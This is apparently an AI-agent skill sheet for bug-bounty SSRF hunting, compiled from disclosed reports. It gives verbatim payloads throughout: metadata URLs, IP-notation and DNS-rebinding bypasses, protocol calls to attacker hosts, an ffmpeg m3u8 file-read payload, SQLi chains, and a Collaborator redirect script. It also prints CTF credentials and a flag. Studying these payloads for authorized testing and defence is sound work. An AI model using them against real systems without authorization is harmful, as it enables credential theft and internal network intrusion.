---
name: hunter-l3-ssrf
description: "Use when hunting SSRF on a target. Loads the L3 technique sheet: Server-Side Request Forgery is the class of bugs where the target application's server makes a network request to a URL or host the attacker controls (or influences)."
domain: cybersecurity
subdomain: web
tags:
- web
- ssrf
- hunting
- l3
version: '1.0'
---

# SSRF — Technique Sheet

## Overview

Server-Side Request Forgery is the class of bugs where the target application's server makes a network request to a URL or host the attacker controls (or influences). It pays when the server can reach things you can't: cloud metadata (169.254.169.254), localhost-only admin/API services, internal RFC1918 networks, or when the request leaks internal topology (port states, banners, internal hostnames). The records here show the full spectrum — blind Collaborator callbacks, port-scanning primitives, metadata reads, and full-response-read SSRF pivoting into internal APIs — plus the two most reliable bypass families: DNS rebinding against TOCTOU validators, and protocol/ffmpeg-based tricks.

## Distinct sub-patterns

### 1. Unvalidated `url` parameter on a fetch/proxy/preview endpoint

The most common shape: any endpoint that takes a URL and fetches it server-side.

- Endpoint shapes seen: `GET /conferences/get_recording_slides_xml.xml?url=...` (HackerOne, id=1028396), `GET /api/v2/url_info?url=...` (Automattic, id=1057531), `GET /request?url=...` (APITest.IO, id=128685), Evernote `GET /ro/{base64-url}/-1430533899.js` (id=1189367), Slack `POST /account/photo` with `url` (id=14127), Nextcloud `POST .../federation/trusted-servers` with `url=` (id=145524), Acronis `GET /login/wl?bzIframeUrl=...` (id=1241149), Concrete CMS `POST /upload-from-remote` (id=1364797), Factlink proxy `GET /?url=` (id=1409), LINE preview `og:image` URL (id=1131608), Lark "import as docs" (id=1409727).
- Payloads that fired: `http://127.0.0.1:9090` (Automattic); `http://0x7f.1/` (APITest.IO — hex IP notation passed the filter); base64 of `http://169.254.169.254/#.js` in Evernote's `/ro/` path; `http://169.254.169.254/latest/meta-data/` (Acronis); `url=http://127.0.0.1:80` (Nextcloud); `http://192.168.1.157/info.php/test.html` (Concrete CMS — trailing `/test.html` satisfies an extension check while still hitting `info.php`); `http://fct.li/?url=https://172.18.64.13` (retrieved internal Chef server HTML).
- Root cause: no SSRF validation layer at all, or a filter missing 0.0.0.0/hex-IP notation/private ranges/ports.
- Impact proven: internal Chef server HTML read (Factlink); EC2 metadata key listings (Acronis); OpenStack metadata directory listing + loopback nginx + vestacp admin on :8081 (APITest.IO); port-state inference from response timing (Automattic, Nextcloud: 127.0.0.1:80 open → 404, :8080 closed → connection refused); full-response-read internal network access (Evernote, Lark — CVSS 9.6).
- Exemplars: id=1189367 (Evernote), id=1241149 (Acronis).

### 2. Cloud metadata targeting (169.254.169.254)

- Shapes: custom "HTTP integration" endpoint input (Helium, id=1055823) with payload `http://169.254.169.254/latest/meta-data/ami-id`; website preview `og:image` → `http://169.254.169.254/latest/meta-data/` (LINE, id=1131608); Acronis iframe URL; Evernote `/ro/` base64 path.
- Root cause: same fetch feature, no link-local blocking.
- Impact: EC2 `ami-id` retrieval echoed into the integration message body (Helium); metadata key listing including `iam/`, `identity-credentials/`, `local-ipv4`, `security-groups` (Acronis). Note: full token extraction is often blocked — in GitLab Runner (id=809248) only the first character `a` of the access token leaked into logs, but blind issuance of GET/POST/DELETE to link-local targets with response bodies on success still held.
- Exemplars: id=1055823, id=1241149.

### 3. Protocol-scheme abuse in libcurl-based fetchers (no protocol whitelist)

- Shape: `GET /vidgif/url?url=...` (Imgur, id=115748); `POST /account/photo` `url` (Slack, id=14127).
- Payload: `sftp://evil.com:11111/` (Imgur); `dict://95.211.198.76:6666/picture-54679.jpg` (Slack).
- Root cause: curl/libcurl configured without `CURLOPT_PROTOCOLS` restrictions; no disabled URL wrappers; no port whitelist. FTP, SFTP, GOPHER, TFTP, DICT, LDAP, TELNET, POP3 all followed.
- Impact: Imgur servers connected to attacker netcat and leaked `SSH-2.0-libssh2_1.4.2` and `CLIENT libcurl 7.40.0`; a valid SMTP email was sent from an Imgur EC2 IP via gopher. Slack's Slackbot UA connected back over HTTP, gopher, dict, ldap, telnet, pop3 on arbitrary ports — SSRF usable for internal port scanning via timing.
- Chain note (Imgur): the newline filter on the GET `url` was bypassed via an HTTP 302 redirect carrying the forbidden characters.
- Exemplars: id=115748, id=14127.

### 4. FFmpeg m3u8/concat processing (SSRF + local file read)

- Shape: `POST /vidgif/upload` with a `source` file (Imgur, ids=115857/115978); TikTok video upload to FFmpeg HLS processing (id=1062888).
- Verbatim payload (id=115857):
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://yngwie.ru/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```
(id=115978 reversed the order: `concat:file:///etc/passwd|http://gradeco.ru:12346/`).
- Root cause: ffmpeg/Lavf built with network options enabled parses m3u8 playlists and follows `concat:` and `file://` URLs regardless of the declared content-type (served as `video/avi` to pass upload validation).
- Impact: server-side HTTP GET to attacker URL (confirmed UA `Lavf/55.48.100`); first line of `/etc/passwd` leaked (`root:x:0:0:root:/root:/bin/bash`); local file existence enumeration; DoS by holding ffmpeg connections open against a TARPIT. TikTok variant: local file disclosure via attacker-pointed HLS manifest.
- Exemplars: id=115857, id=115978.

### 5. Internal-only APIs reached via SSRF (SQLi-forged signed fetches)

- Shape: h1-ctf `/r3c0n_server_4fdk59/album?hash={hash}` chained into `GET /picture?data={signed}`. The `hash` param is SQL-injectable; a nested UNION lets you control the photo filename/path, so the server fetches internal `../api/*` paths that are IP-restricted.
- Verbatim payloads:
  - `' UNION SELECT "' union select 1,2,'../api/user'#"...",1,2#` (id=1065731)
  - `-1'+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,0x41--+-",2,3-+-` (id=1065885)
  - `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/endpoint' -- -",'1',1-- -` (id=1067443)
  - Hex-encoded variant: `' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 -- ` (id=1069141)
- Root cause: SQLi controls a value that is later fetched server-side; the picture fetcher is a validated SSRF with no IP restriction on relative internal paths.
- Impact: reached localhost-only `/api/user` (response diff: "Expected HTTP status 200, Received: 204" confirmed reachability), then LIKE-based blind SQLi on the internal API extracted credentials `grinchadmin:s4nt4sucks` → attack-box login → flag.
- Exemplars: id=1067443, id=1069141.

### 6. DNS rebinding against TOCTOU validators (the dominant h1-ctf bypass family)

- Shape: `GET /attack-box/launch?payload={base64 JSON {"target":"<host>","hash":"md5(salt+target)"}}`. Server validates the resolved IP at one point, then makes the actual request using a second resolution or the original hostname.
- Verbatim payloads: `{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}` (id=1066203); `7f000001.c0a80001.rbndr.us` (ids=1066504, 1067443, 1067835, 1069392); `make-1-2-3-4-and-127.0.0.1-rr.1u.ms` (id=1068880); `make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms` (id=1069039, Reddit); `A.1.1.1.1.1time.127.0.0.1.forever.rebind.network` (id=1069141); `1s.203-0-113-33.but-50-pct.127-0-0-1.4i.am` (id=1069189, 50% rebind probability); `470631266f2a4f108432eff944f33ed6.gel0.space` (id=1069392).
- Root cause: (a) the IP filter validates only the first DNS resolution while the request re-resolves or uses the raw hostname (TOCTOU); (b) the anti-tamper hash is only `md5(salt+target)` with a crackable salt.
- Impact: launched attacks against 127.0.0.1, took the target network down (DoS) — flag `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}` across ~10 reports.
- Exemplars: id=1066203 (Stripe), id=1069189.

### 7. Crackable signing hashes (salt recovery) — the enabler for #6

- Root cause: `md5(salt + target)` where the salt is low-entropy. Recovered via hashcat `-m 10` (md5($pass.$salt)) with known target/hash pairs: salt = `mrgrinch463`.
- Payload: base64 JSON as above, e.g. `eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9` (ids=1066851, 1069392, 1068934).
- Chain: decode base64 payload → collect known (target, hash) pairs → hashcat with targeted wordlist (Christmas words) → forge hashes for arbitrary/rebind targets.
- Exemplars: id=1068880, id=1069039.

### 8. SSRF carrying internal auth headers (redirect into a screenshot service)

- Shape: Shopify theme preview — inject into `header.liquid` served to the internal screenshot service.
- Payload: `<script>window.location="https://[paste_here_collaborator]/";</script>`
- Root cause: the screenshot/preview service followed a client-side redirect embedded in user-editable theme code, and its request carried an internal auth header.
- Impact: captured `X-ABS-App-Token: screenshot-service-production@<redacted>` in the attacker's Collaborator request — internal credential theft.
- Exemplar: id=1067443 (Shopify, first record).

### 9. HTML-to-PDF generator SSRF (sanitizer bypass with iframe)

- Shape: Shopify packing slip template (admin/settings/packing_slip_template), PDF generator.
- Payload: `<svg><style><h1/><iframe src="https://kubernetes.default.svc/info" width=1001 height=1001>`
- Root cause: bare `<iframe>` is stripped, but the `<svg><style><h1/>` prefix bypasses the sanitizer, leaving the iframe; the PDF renderer fetches the src server-side.
- Impact: hit internal Kubernetes API (`https://kubernetes.default.svc/info`, `/livez?verbose`). GCP metadata was blocked by the HTTPS-only protocol filter — a real limitation to expect.
- Exemplar: id=1119228's sibling id=1115139.

### 10. XML schemaLocation / external entity fetch

- Shape: `POST https://██████.mil/████` with XML (id=1150799).
- Payload: `<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>`
- Root cause: parser accepts external schemaLocation/entity references; plus a separate unvalidated URL parameter.
- Impact: DNS+HTTP callbacks from target-network IPs — blind SSRF usable as an attack proxy to internal containers.
- Exemplar: id=1150799.

### 11. Import features fetching URLs from trusted-domain responses

- Shapes: GitLab FogBugz import (`POST /import/fogbugz`) — URL host is whitelisted to `*.fogbugz.com`, but CarrierWave/Kernel.open downloads attachment URLs found in the response without blocking 127.0.0.1 or redirects → full GET SSRF to `http://127.0.0.1:9090/api/v1/targets` (id=1092230; chain requires controlling a `*.fogbugz.com` subdomain). GitLab "Repo by URL" import (`POST /import`, param `import_url`) with no localhost blocking (id=135937).
- Exemplars: id=1092230, id=135937.

### 12. Known-CVE SSRF surfaces and infrastructure components

- ProxyLogon: `GET /owa/auth/x.js` with cookies `X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3` (CVE-2021-26855, id=1119228).
- Solr ReplicationHandler: `GET /solr/admin/cores?masterUrl=http://...burpcollaborator.net` (CVE-2021-27905, id=1183472) — Collaborator received an HTTP request from the target server.
- Internal services themselves: exposed Uber Flyte instance with full-read SSRF (id=1540906); BIME Connector Designer disclosing AWS metadata (id=112156); Uber-style fetchers aside, the pattern is: internal/exposed tools that fetch URLs are their own SSRF class.
- Exemplars: id=1183472, id=1119228.

### 13. Non-HTTP protocol trust bugs: FTP PASV

- Shapes: curl FTP data channel (id=1040166) and Ruby `Net::FTP` (id=1145454).
- Verbatim payload (id=1145454): malicious server response `227 Entering Passive Mode (127,0,0,1,31,187)` → data connection to 127.0.0.1:8123.
- Root cause: client trusts the IP/port in the PASV response instead of reusing the control-connection IP (curl: `CURLOPT_FTP_SKIP_PASV_IP` disabled by default).
- Impact: TCP port scanning with open/filtered/closed distinction; extracted SSH banner `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8`.
- Exemplars: id=1040166, id=1145454.

### 14. Feature fields that are secretly sockets

- phpBB ACP Jabber settings: `jabber_server=127.0.0.1`, `jabber_port=<target>` — the app connects to the host:port and prints socket + service banner info (connected to internal sshd on 127.0.0.1:2222 and read its banner) (id=1018568). Similarly Slack's photo URL with no port whitelist enabled timing-based port scanning (id=14127).
- Exemplar: id=1018568.

### 15. CSRF-armed SSRF / 0.0.0.0 trick

- Shape: `GET /wp-admin/press-this.php?u=htto://0.0.0.0:8080&url-scan-submit=Scan` (Automattic, id=110801).
- Root cause: no CSRF token on the scrape action; URL filter accepts `0.0.0.0:PORT` (binds to all interfaces, resolves to the server itself).
- Impact: victim's WordPress server sent a GET to its own 127.0.0.1 service — internal GET SSRF on behalf of a logged-in victim.
- Exemplar: id=110801.

### 16. SVG / server-side resource fetches

- Shopify partner app icon SVG upload with an attacker-controlled `xlink` href (param `xlink` on `POST /services/partners/api_clients/{num}`): server fetched the external resource; attacker's log received the request (id=142709). Related: Slack photo URL and og:image cases above.
- Exemplar: id=142709.

### 17. Hostname-canonicalization bypass (deny-list)

- Stripe Smokescreen proxy: payload `https://internal.example.com.` — trailing dot bypasses the domain deny-list string match (id=1410214).
- Exemplar: id=1410214.

### 18. Pingback / XML-RPC reflection

- `POST /wordpress/xmlrpc.php`, method `pingback.ping` (id=1004847): server fetches arbitrary attacker URLs — used with grabify to log the server's internal IP; also usable for DDoS coordination. Payload not stated beyond the method name.
- Exemplar: id=1004847.

### 19. Blind-collaborator confirmation on generic message/chat features

- MTN chat message send with a URL in the message (id=1220688): Collaborator received DNS + HTTP interactions and the server fetched the referenced file — blind SSRF with external interaction. Payload not stated.
- Exemplar: id=1220688.

## Bypass / chain notes

- DNS rebinding tooling seen: `rbndr.us` (hex-pair format `7f000001.c0a80001` = 127.0.0.1 / 192.168.0.1, flip per query), `1u.ms` (expressive: `make-1-2-3-4-and-127.0.0.1-rr`, `rebindfor15s`), `rebind.network` (`A.1.1.1.1.1time.127.0.0.1.forever`), `4i.am` (`1s.203-0-113-33.but-50-pct.127-0-0-1` — 50% chance per resolution), `gel0.space`. Retry until validation and request resolve differently.
- IP-notation bypasses: `0x7f.1` (hex), `0.0.0.0` — both slipped past filters that only match decimal `127.0.0.1`.
- Path/extension bypass: `http://192.168.1.157/info.php/test.html` — PATH_INFO keeps the script executing while the extension check sees `.html`.
- Trailing-dot hostname (`internal.example.com.`) bypasses exact-match deny-lists.
- HTTP 302 redirect as a filter smuggler: forbidden characters/newlines in the GET `url` were reintroduced server-side after following a redirect (Imgur).
- Signature forging: md5(salt+target) with recoverable salt via hashcat -m 10 (known-plaintext = the target itself).
- Chaining observed in records: SQLi → SSRF → internal blind SQLi → credential extraction → login (h1-ctf album chain); reverse shell on CI executor → root + docker certs → redirect-following SSRF → GCP metadata (GitLab Runner); SVG/xlink, og:image, and PDF-iframe as fetch primitives; CSRF → SSRF-on-behalf-of-victim.
- Timing side channels: connection-refused vs. timeout vs. HTTP-status differences distinguish closed/open/filtered (Nextcloud, Automattic, Slack).

## Gotchas / what NOT to do

- Expect HTTPS-only or scheme filters on some renderers: the Shopify PDF generator blocked `http://169.254.169.254` because only HTTPS was allowed — pick the fetcher that fits your target scheme.
- Full token exfiltration from cloud metadata is often truncated: GitLab Runner leaked only the first character of the GCP access token into logs. Blind issuance to link-local with status-based inference is still reportable, but scope your claim to what you proved.
- Don't trust the declared content-type to gate parsing: ffmpeg processed m3u8 served as `video/avi`. Conversely, don't assume your m3u8 survives upload validation — spoof the content-type.
- Don't forget redirect behavior: validation is usually applied at URL-parse time; a 302 can carry the blocked scheme/characters/destination.
- Crack the salt before assuming the hash protects anything: known (input, hash) pairs make md5(salt+input) trivially reversible with hashcat.
- TOCTOU means a "validated" request isn't validated at request time — check whether the request re-resolves DNS or reuses the raw hostname.
- Don't report mere internal-port scanning alone at most programs when metadata or response-body read is achievable — escalate; but do note that port-state mapping + banner grab (SSH version) was itself accepted on curl and Ruby reports.
- Beware DoS-shaped payloads (TARPIT against ffmpeg, self-DDoS) — in a CTF that was the goal; in a real program, demonstrate reachability without actually taking the service down.

## Real-world impact examples

- AWS/EC2 metadata read: instance metadata listing incl. `iam/`, `identity-credentials/`, `local-ipv4`, `security-groups` (Acronis, id=1241149); `ami-id` echoed back in-app (Helium, id=1055823).
- Internal credential theft: `X-ABS-App-Token` leaked via screenshot-service redirect (Shopify, id=1067443); `grinchadmin:s4nt4sucks` extracted from a localhost-only API via SSRF+blind SQLi (multiple h1-ctf records).
- Full internal-network reads: Chef server HTML (Factlink, id=1409); any internal host with full response bodies (Evernote, id=1189367); Lark import, CVSS 9.6 (id=1409727).
- Banner/version disclosure: `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8` via Ruby Net::FTP PASV (id=1145454); `SSH-2.0-libssh2_1.4.2` + libcurl version via Imgur sftp (id=115748).
- Local file read: `/etc/passwd` first line via ffmpeg `concat:file://` (Imgur, id=115857).
- Availability: self-DoS via DNS rebinding (h1-ctf attack-box, ~10 reports); ffmpeg TARPIT DoS (Imgur, id=115978).
- Internal service exploitation: Kubernetes API `/info` and `/livez?verbose` from a PDF renderer (Shopify, id=1115139); internal phpinfo fetch (Concrete CMS, id=1364797); vestacp admin panel on 127.0.0.1:8081 (APITest.IO, id=128685); GitLab localhost:9090 internal API (id=1092230).